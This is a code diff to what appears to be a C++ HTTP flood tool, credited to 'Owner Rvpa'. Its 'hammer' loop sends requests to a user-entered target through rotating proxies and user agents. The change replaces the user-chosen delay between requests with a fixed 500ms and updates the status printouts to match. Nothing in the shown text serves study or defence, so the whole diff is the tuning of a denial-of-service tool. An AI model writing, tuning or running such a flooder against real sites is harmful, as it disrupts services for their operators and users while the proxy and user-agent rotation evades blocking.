@@ -136,7 +136,7 @@ std::vector<std::string> proxies = {
 std::atomic<int64_t> sent(0);
 std::atomic<bool> running(true);
 int threads = 0;
-double delay = 1.0;
+double delay = 0.5;
 std::string target;
 std::string host;
 std::string path;
@@ -313,7 +313,7 @@ void hammer() {
         }
         CLOSE(proxyFd);
 
-        std::this_thread::sleep_for(std::chrono::duration<double>(delay));
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 }
 
@@ -333,7 +333,7 @@ void printStatus() {
         std::cout << "\n  TARGET : " << target << "\n";
         std::cout << "  SENT   : " << sent.load() << "\n";
         std::cout << "  THREAD : " << threads << "\n";
-        std::cout << "  DELAY  : " << delay << "s\n";
+        std::cout << "  DELAY  : 500ms\n";
         std::cout << "  PROXY  : " << proxies.size() << " rotating\n";
         std::cout << "  UA     : " << uas.size() << " rotating\n";
         std::cout << "\n  Owner Rvpa\n";
@@ -353,10 +353,7 @@ int main() {
     std::cin >> threads;
     std::cout << "  Target : ";
     std::cin >> target;
-    std::cout << "  Delay  : ";
-    std::string delayStr;
-    std::cin >> delayStr;
-    delay = delayStr.empty() ? 1.0 : std::stod(delayStr);
+    std::cout << "  Delay  : 500ms (fixed)\n";
 
     if (target.find("http://") == 0) {
         target = target.substr(7);
@@ -389,7 +386,7 @@ int main() {
     std::cout << "\n  [+] Thread : " << threads << "\n";
     std::cout << "  [+] Target : " << host << ":" << port << path << "\n";
     std::cout << "  [+] HTTPS  : " << (isHttps ? "true" : "false") << "\n";
-    std::cout << "  [+] Delay  : " << delay << "s\n";
+    std::cout << "  [+] Delay  : 500ms\n";
     std::cout << "  [+] Proxy  : " << proxies.size() << " rotating\n";
     std::cout << "  [+] UA     : " << uas.size() << " rotating\n";
     std::cout << "  [+] Starting hammer...\n";
